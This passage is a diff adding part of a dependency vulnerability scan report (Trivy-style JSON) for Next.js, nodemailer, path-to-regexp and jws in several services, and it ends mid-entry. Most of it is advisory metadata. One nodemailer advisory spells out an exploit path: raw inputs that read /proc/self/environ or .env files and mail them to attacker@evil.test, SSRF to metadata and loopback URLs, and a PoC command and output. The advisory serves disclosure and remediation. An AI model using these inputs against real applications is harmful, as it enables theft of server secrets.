+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+              "V3Score": 8.6
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+              "V3Score": 8.6
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-44578",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2477187",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/releases/tag/v15.5.16",
+            "https://github.com/vercel/next.js/releases/tag/v16.2.5",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-c4j6-fc7j-m34r",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44578",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-44578.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-44578"
+          ],
+          "PublishedDate": "2026-05-13T18:16:17.99Z",
+          "LastModifiedDate": "2026-06-30T03:20:00.273Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44579",
+          "PkgID": "next@15.3.3",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@15.3.3",
+            "UID": "53ceb7947fa1155d"
+          },
+          "InstalledVersion": "15.3.3",
+          "FixedVersion": "15.5.16, 16.2.5",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44579",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "next.js: Next.js: Denial of Service via crafted POST requests to server actions",
+          "Description": "Next.js is a React framework for building full-stack web applications. From  to before 15.5.16 and 16.2.5, applications using Partial Prerendering through the Cache Components feature can be vulnerable to connection exhaustion through crafted POST requests to a server action. In affected configurations, a malicious request can trigger a request-body handling deadlock that leaves connections open for an extended period, consuming file descriptors and server capacity until legitimate users are denied service. This vulnerability is fixed in 15.5.16 and 16.2.5.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-770",
+            "CWE-833"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-44579",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2477193",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/releases/tag/v15.5.16",
+            "https://github.com/vercel/next.js/releases/tag/v16.2.5",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-mg66-mrh9-m8jx",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44579",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-44579.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-44579"
+          ],
+          "PublishedDate": "2026-05-13T18:16:18.123Z",
+          "LastModifiedDate": "2026-06-30T03:20:00.47Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-45109",
+          "PkgID": "next@15.3.3",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@15.3.3",
+            "UID": "53ceb7947fa1155d"
+          },
+          "InstalledVersion": "15.3.3",
+          "FixedVersion": "15.5.18, 16.2.6",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-45109",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "next.js: Next.js: Information disclosure via security fix bypass in middleware with Turbopack",
+          "Description": "Next.js is a React framework for building full-stack web applications. From 15.2.0 to before 15.5.18 and 16.2.6, it was found that the fix addressing CVE-2026-44575 did not apply to middleware.ts with Turbopack. This vulnerability is fixed in 15.5.18 and 16.2.6.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-288",
+            "CWE-358"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-45109",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2477190",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/releases/tag/v15.5.18",
+            "https://github.com/vercel/next.js/releases/tag/v16.2.6",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-267c-6grr-h53f",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-26hh-7cqf-hhc6",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-45109",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-45109.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-45109"
+          ],
+          "PublishedDate": "2026-05-13T18:16:19.283Z",
+          "LastModifiedDate": "2026-06-30T03:20:02.8Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-8h8q-6873-q5fj",
+          "PkgID": "next@15.3.3",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@15.3.3",
+            "UID": "53ceb7947fa1155d"
+          },
+          "InstalledVersion": "15.3.3",
+          "FixedVersion": "15.5.16, 16.2.5",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-8h8q-6873-q5fj",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "Next.js Vulnerable to Denial of Service with Server Components",
+          "Description": "A vulnerability affects certain React Server Components packages for versions 19.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23870](https://github.com/facebook/react/security/advisories/GHSA-rv78-f8rc-xrxh). \n\nA specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage. This can result in denial of service in unpatched environments.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://github.com/facebook/react/security/advisories/GHSA-rv78-f8rc-xrxh",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-8h8q-6873-q5fj",
+            "https://github.com/vitejs/vite-plugin-react/security/advisories/GHSA-w94c-4vhp-22gx",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-23870"
+          ],
+          "PublishedDate": "2026-05-11T14:50:27Z",
+          "LastModifiedDate": "2026-05-11T14:50:27Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-h25m-26qc-wcjf",
+          "PkgID": "next@15.3.3",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@15.3.3",
+            "UID": "53ceb7947fa1155d"
+          },
+          "InstalledVersion": "15.3.3",
+          "FixedVersion": "15.0.8, 15.1.12, 15.2.9, 15.3.9, 15.4.11, 15.5.10, 15.6.0-canary.61, 16.0.11, 16.1.5",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-h25m-26qc-wcjf",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "Next.js HTTP request deserialization can lead to DoS when using insecure React Server Components",
+          "Description": "A vulnerability affects certain React Server Components packages for versions 19.0.x, 19.1.x, and 19.2.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23864](https://github.com/facebook/react/security/advisories/GHSA-83fc-fqcc-2hmg).\n\nA specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage, out-of-memory exceptions, or server crashes. This can result in denial of service in unpatched environments.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://github.com/facebook/react/security/advisories/GHSA-83fc-fqcc-2hmg",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-h25m-26qc-wcjf",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-23864",
+            "https://vercel.com/changelog/summary-of-cve-2026-23864"
+          ],
+          "PublishedDate": "2026-01-28T15:38:01Z",
+          "LastModifiedDate": "2026-01-28T15:38:01Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-mwv6-3258-q52c",
+          "PkgID": "next@15.3.3",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@15.3.3",
+            "UID": "53ceb7947fa1155d"
+          },
+          "InstalledVersion": "15.3.3",
+          "FixedVersion": "14.2.34, 15.0.6, 15.1.10, 15.2.7, 15.3.7, 15.4.9, 15.5.8, 15.6.0-canary.59, 16.0.9, 16.1.0-canary.17",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-mwv6-3258-q52c",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "Next Vulnerable to Denial of Service with Server Components",
+          "Description": "A vulnerability affects certain React packages for versions 19.0.0, 19.0.1, 19.1.0, 19.1.1, 19.1.2, 19.2.0, and 19.2.1 and frameworks that use the affected packages, including Next.js 15.x and 16.x using the App Router. The issue is tracked upstream as [CVE-2025-55184](https://www.cve.org/CVERecord?id=CVE-2025-55184).\n\nA malicious HTTP request can be crafted and sent to any App Router endpoint that, when deserialized, can cause the server process to hang and consume CPU. This can result in denial of service in unpatched environments.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-mwv6-3258-q52c",
+            "https://nextjs.org/blog/security-update-2025-12-11",
+            "https://www.cve.org/CVERecord?id=CVE-2025-55184"
+          ],
+          "PublishedDate": "2025-12-11T22:49:27Z",
+          "LastModifiedDate": "2025-12-11T22:49:28Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-q4gf-8mx6-v5v3",
+          "PkgID": "next@15.3.3",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@15.3.3",
+            "UID": "53ceb7947fa1155d"
+          },
+          "InstalledVersion": "15.3.3",
+          "FixedVersion": "15.5.15, 16.2.3",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-q4gf-8mx6-v5v3",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "Next.js has a Denial of Service with Server Components",
+          "Description": "A vulnerability affects certain React Server Components packages for versions 19.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23869](https://github.com/facebook/react/security/advisories/GHSA-479c-33wc-g2pg). You can read more about this advisory our [this changelog](https://vercel.com/changelog/summary-of-cve-2026-23869).\n\nA specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage. This can result in denial of service in unpatched environments.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-q4gf-8mx6-v5v3",
+            "https://vercel.com/changelog/summary-of-cve-2026-23869"
+          ],
+          "PublishedDate": "2026-04-10T15:35:47Z",
+          "LastModifiedDate": "2026-04-10T15:35:47Z"
+        }
+      ]
+    },
+    {
+      "Target": "notification-service/package-lock.json",
+      "Class": "lang-pkgs",
+      "Type": "npm",
+      "Vulnerabilities": [
+        {
+          "VulnerabilityID": "CVE-2025-14874",
+          "PkgID": "nodemailer@7.0.3",
+          "PkgName": "nodemailer",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/nodemailer@7.0.3",
+            "UID": "ad8ed18621362bc3"
+          },
+          "InstalledVersion": "7.0.3",
+          "FixedVersion": "7.0.11",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-14874",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "nodemailer: Nodemailer: Denial of service via crafted email address header",
+          "Description": "A flaw was found in Nodemailer. This vulnerability allows a denial of service (DoS) via a crafted email address header that triggers infinite recursion in the address parser.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-703"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2025-14874",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2418133",
+            "https://github.com/nodemailer/nodemailer",
+            "https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150",
+            "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v",
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-14874",
+            "https://www.cve.org/CVERecord?id=CVE-2025-14874"
+          ],
+          "PublishedDate": "2025-12-18T09:15:44.87Z",
+          "LastModifiedDate": "2026-06-17T08:36:41.44Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-p6gq-j5cr-w38f",
+          "PkgID": "nodemailer@7.0.3",
+          "PkgName": "nodemailer",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/nodemailer@7.0.3",
+            "UID": "ad8ed18621362bc3"
+          },
+          "InstalledVersion": "7.0.3",
+          "FixedVersion": "9.0.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-p6gq-j5cr-w38f",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "Nodemailer: Message-level raw option bypasses disableFileAccess/disableUrlAccess, enabling arbitrary file read and full-response SSRF in the delivered message",
+          "Description": "# Message-level `raw` option bypasses `disableFileAccess` / `disableUrlAccess`, enabling arbitrary file read and full-response SSRF in the sent message\n\n- **Target:** nodemailer/nodemailer, npm `nodemailer` **v9.0.0** (HEAD `4e58450eb490e5097a74b2b2cce35a8d9e21856e`)\n- **Verdict:** CONFIRMED (local PoC, no network)\n\n## Summary\n\nNodemailer exposes `disableFileAccess` and `disableUrlAccess` so an application that passes\n**untrusted** message data to the library can forbid that data from reading local files or\nfetching URLs. Every attachment, alternative, `html`/`text`/`watchHtml`/`amp` and `icalEvent`\ncontent node honors these flags. **The message-level `raw` option does not.**\n\n`MailComposer.compile()` builds the root MIME node for a `raw` message **without** threading the\ntwo flags, so a `raw: { path: '/etc/passwd' }` or `raw: { href: 'http://169.254.169.254/…' }`\nmessage is read / fetched anyway, and the file or HTTP-response bytes become the **actual\nmessage that is sent** by every transport (SMTP, SES, sendmail, stream, JSON). An actor whose\ninput the application intended to sandbox therefore obtains arbitrary local-file disclosure and\na full-response SSRF primitive, delivered to a recipient the same actor can choose.\n\nThis is the same vulnerability class as the already-published jsonTransport advisory\n**GHSA-wqvq-jvpq-h66f**, but a **distinct code path** (`raw` root node, not `normalize()`), and\nstrictly higher impact: the jsonTransport bug only affected the locally-returned JSON, whereas\nthis affects the delivered RFC822 message for all transports.\n\n## Affected component\n\n- `lib/mail-composer/index.js:34-35` — root cause:\n  ```js\n  if (this.mail.raw) {\n      this.message = new MimeNode('message/rfc822', { newline: this.mail.newline }).setRaw(this.mail.raw);\n  }\n  ```\n  The `MimeNode` is constructed with only `{ newline }`. Compare the sibling node builders\n  `_createMixed`/`_createAlternative`/`_createRelated`/`_createContentNode`\n  (`lib/mail-composer/index.js:389-527`), which all pass\n  `disableUrlAccess: this.mail.disableUrlAccess, disableFileAccess: this.mail.disableFileAccess`.\n- `lib/mime-node/index.js:51-52` — the constructor derives `this.disableFileAccess`/\n  `this.disableUrlAccess` solely from its own `options`; children do **not** inherit a parent's\n  flags (`createChild`/`appendChild`, lines 175-194, pass options through verbatim).\n- `lib/mime-node/index.js:812` — `setRaw()` content is resolved through `this._getStream(this._raw)`.\n- `lib/mime-node/index.js:984-1010` — `_getStream` reads the file (`fs.createReadStream`, 995) or\n  fetches the URL (`nmfetch`, 1009) **only guarded by `this.disableFileAccess`/`this.disableUrlAccess`**,\n  which on the `raw` root node are `false`.\n- Reached from the normal send flow at `lib/mailer/index.js:188`\n  (`mail.message = new MailComposer(mail.data).compile()`), so every transport is affected.\n\n## Reachability gate (hop-by-hop)\n\n1. **Source.** Application calls `transporter.sendMail({ raw: \u003cuserControlled\u003e , to: \u003cuserControlled\u003e })`\n   with `disableFileAccess: true` and/or `disableUrlAccess: true` configured on the transporter\n   (forced onto `mail.data` in `lib/mailer/mail-message.js:36-40`) or per message. This is the\n   exact scenario the flags exist for — the same precondition under which GHSA-wqvq-jvpq-h66f was\n   accepted.\n2. **Guard — the access flags.** For attachments the flag is enforced: a node created by\n   `_createContentNode` carries `disableFileAccess`, so `_getStream` throws `EFILEACCESS`.\n   **Bypass:** the `raw` branch (`compile():34-35`) never sets the flag on its node, so\n   `this.disableFileAccess === false` and the guard at `mime-node:985` / `:999` is skipped.\n   There is no other validation between `mail.raw` and the read; `raw` content shapes\n   (`{path}`, `{href}`, stream, string, buffer) are accepted as-is by `setRaw`/`_getStream`.\n3. **Sink.** `fs.createReadStream(content.path)` (file disclosure) or\n   `nmfetch(content.href, …)` (SSRF). The resulting bytes are emitted as the message body by\n   `createReadStream()`, which every transport pipes to its destination\n   (`smtp-transport:233`, `smtp-pool/pool-resource:208`, `ses-transport:96`, `sendmail-transport:184`,\n   `stream-transport:67`).\n\nNo guard blocks the chain; the only guard (the access flags) is structurally absent on this node.\n\n## Root cause\n\nInconsistent enforcement: the access policy is applied per-`MimeNode` via constructor options and\nmust be re-passed at every node creation. The `raw`-message shortcut in `compile()` omits it,\nwhile all five other node builders include it. The flags are therefore enforced for every content\ntype *except* the one that lets the caller supply a complete message body by path/URL.\n\n## Exploit path\n\nApplication that sandboxes untrusted mail input (`disableFileAccess`/`disableUrlAccess` set):\n\n1. Untrusted actor supplies `raw: { path: '/proc/self/environ' }` (or any server file:\n   `/app/.env`, key material, etc.) and `to: attacker@evil.test`.\n2. `compile()` builds the raw root node without the flags; the transport reads the file and sends\n   its contents as the message → **arbitrary server-file exfiltration to an attacker-chosen mailbox.**\n3. Alternatively `raw: { href: 'http://127.0.0.1:8080/admin' }` or a cloud metadata URL →\n   Nodemailer fetches it server-side and delivers the full response body in the email →\n   **full-response SSRF** (no blind-channel limitation).\n\n## Impact\n\n- **Confidentiality (High):** arbitrary local file read disclosed in the outgoing message;\n  full-response SSRF to internal/metadata endpoints, also disclosed in the message.\n- **Integrity (Low):** attacker-fetched/file content is injected into the delivered mail.\n- The two protective flags an application relies on to contain untrusted input are silently\n  ineffective for `raw`.\n\n## Preconditions\n\nThe application (a) passes `disableFileAccess` and/or `disableUrlAccess` (the documented sandboxing\nflags) and (b) lets untrusted input influence the `raw` field (and, for maximal disclosure, `to`).\nNo other configuration is required; all bundled transports are affected. This mirrors the accepted\nprecondition of GHSA-wqvq-jvpq-h66f.\n\n## Severity\n\n- **AV** — message data routinely originates over the network in the apps these flags protect.\n- **AC** — a single crafted `raw` object; deterministic.\n- **PR** — the actor is a user whose input the app already treats as untrusted (the reason the\n  flags are set); not fully anonymous in the typical deployment.\n- **UI** — no victim interaction.\n- **S** — impact within Nodemailer's process scope.\n- **C** — arbitrary file read **and** full-response SSRF, both delivered to an attacker-chosen\n  recipient. (The sibling jsonTransport advisory used C:L because its leak stayed in locally-returned\n  JSON; here the bytes leave the system in the sent message, so C:H is warranted.)\n- **I** — attacker injects fetched/file bytes into the outgoing message.\n- **A**.\nNote: if a deployment fixes the recipient (`to` not attacker-controlled) the disclosure channel\nnarrows and the rating degrades toward the sibling's Medium; the High rating reflects the\nreasonable worst case where `raw` and `to` are both untrusted.\n\n## Adversarial re-read (attempts to refute)\n\n1. **\"`raw` content is by-design trusted, so the flags shouldn't apply.\"** Rejected: every other\n   content path (attachments, alternatives, html/text, icalEvent) honors the flags, and the\n   maintainer already accepted GHSA-wqvq-jvpq-h66f for exactly this \"untrusted input + flag set\"\n   model. The asymmetry — attachment `{path}` is blocked but `raw:{path}` is not — is the bug, and\n   the PoC's CONTROL case proves the flag is otherwise effective on the same file.\n2. **\"The raw node inherits the flags via rootNode.\"** Rejected by code and by PoC: `compile():35`\n   constructs the node with `{ newline }` only; `MimeNode` constructor sets\n   `this.disableFileAccess = !!options.disableFileAccess` → `false`; `rootNode` is itself; no\n   inheritance exists.\n3. **\"The PoC leaks for an unrelated reason.\"** Rejected: the CONTROL message (`attachments:[{path}]`,\n   same file, same transporter) returns `EFILEACCESS`; only the `raw:{path}` message leaks. The\n   sentinel nonce exists solely in the temp file; the URL nonce is generated server-side and is only\n   obtainable by an actual fetch. Both observables are uniquely bound to the bypass.\n4. **\"Maybe only jsonTransport (already reported) is affected.\"** Rejected: the PoC uses\n   `streamTransport` and the root cause is in `MailComposer.compile()` (`mailer:188`), shared by all\n   transports; jsonTransport is a different (already-fixed) path.\n\nI could not find any guard that blocks the chain; the finding survives.\n\n## Proof of concept (safe, benign)\n\n`findings/nodemailer/raw/poc-raw-fileaccess-bypass.js` — local, no network egress (loopback only),\nno destructive action. Output:\n```\n[CONTROL] attachment path with disableFileAccess: BLOCKED (EFILEACCESS) — flag works here\n[ATTACK]  raw:{path} with disableFileAccess=true: BYPASSED — sentinel file CONTENT present in message\n[ATTACK]  raw:{href} with disableUrlAccess=true (loopback server): BYPASSED — fetched body present (SSRF)\nVERDICT: CONFIRMED\n```\nRun: `node findings/nodemailer/raw/poc-raw-fileaccess-bypass.js` (exit 0 = confirmed).\n\n## Remediation\n\nThread the access policy onto the `raw` root node, exactly as the other builders do:\n```js\nif (this.mail.raw) {\n    this.message = new MimeNode('message/rfc822', {\n        newline: this.mail.newline,\n        disableFileAccess: this.mail.disableFileAccess,\n        disableUrlAccess: this.mail.disableUrlAccess\n    }).setRaw(this.mail.raw);\n}\n```\n(Defense in depth: `setRaw`/`_getStream` could also refuse `{path}`/`{href}` raw content when either\nflag is set, regardless of how the node was constructed.) Add a regression test asserting that\n`raw:{path}` and `raw:{href}` reject with `EFILEACCESS`/`EURLACCESS` when the flags are set, mirroring\nthe attachment tests.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
+              "V3Score": 7.1
+            }
+          },
+          "References": [
+            "https://github.com/nodemailer/nodemailer",
+            "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-p6gq-j5cr-w38f"
+          ],
+          "PublishedDate": "2026-06-18T14:28:05Z",
+          "LastModifiedDate": "2026-06-18T14:28:05Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-4926",
+          "PkgID": "path-to-regexp@8.2.0",
+          "PkgName": "path-to-regexp",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/path-to-regexp@8.2.0",
+            "UID": "3143212cc5ea184d"
+          },
+          "InstalledVersion": "8.2.0",
+          "FixedVersion": "8.4.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-4926",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "path-to-regexp: path-to-regexp: Denial of Service via crafted regular expressions",
+          "Description": "Impact:\n\nA bad regular expression is generated any time you have multiple sequential optional groups (curly brace syntax), such as `{a}{b}{c}:z`. The generated regex grows exponentially with the number of groups, causing denial of service.\n\nPatches:\n\nFixed in version 8.4.0.\n\nWorkarounds:\n\nLimit the number of sequential optional groups in route patterns. Avoid passing user-controlled input as route patterns.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-400",
+            "CWE-1333"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:10153",
+            "https://access.redhat.com/errata/RHSA-2026:10172",
+            "https://access.redhat.com/errata/RHSA-2026:10175",
+            "https://access.redhat.com/errata/RHSA-2026:13545",
+            "https://access.redhat.com/errata/RHSA-2026:13826",
+            "https://access.redhat.com/errata/RHSA-2026:17789",
+            "https://access.redhat.com/errata/RHSA-2026:19409",
+            "https://access.redhat.com/errata/RHSA-2026:19410",
+            "https://access.redhat.com/errata/RHSA-2026:24761",
+            "https://access.redhat.com/errata/RHSA-2026:24762",
+            "https://access.redhat.com/errata/RHSA-2026:24866",
+            "https://access.redhat.com/errata/RHSA-2026:9385",
+            "https://access.redhat.com/errata/RHSA-2026:9742",
+            "https://access.redhat.com/security/cve/CVE-2026-4926",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2451867",
+            "https://cna.openjsf.org/security-advisories.html",
+            "https://github.com/pillarjs/path-to-regexp",
+            "https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-j3q9-mxjg-w52f",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-4926",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-4926.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-4926"
+          ],
+          "PublishedDate": "2026-03-26T19:17:08.387Z",
+          "LastModifiedDate": "2026-06-30T03:20:44.527Z"
+        }
+      ]
+    },
+    {
+      "Target": "user-service/package-lock.json",
+      "Class": "lang-pkgs",
+      "Type": "npm",
+      "Vulnerabilities": [
+        {
+          "VulnerabilityID": "CVE-2025-65945",
+          "PkgID": "jws@3.2.2",
+          "PkgName": "jws",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/jws@3.2.2",
+            "UID": "f7518ce658d0a765"
+          },
+          "InstalledVersion": "3.2.2",
+          "FixedVersion": "3.2.3, 4.0.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-65945",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "node-jws: auth0/node-jws: Improper signature verification in HS256 algorithm",
+          "Description": "auth0/node-jws is a JSON Web Signature implementation for Node.js. In versions 3.2.2 and earlier and version 4.0.0, auth0/node-jws has an improper signature verification vulnerability when using the HS256 algorithm under specific conditions. Applications are affected when they use the jws.createVerify() function for HMAC algorithms and use user-provided data from the JSON Web Signature protected header or payload in HMAC secret lookup routines, which can allow attackers to bypass signature verification. This issue has been patched in versions 3.2.3 and 4.0.1.",
+          "Severity": "HIGH",
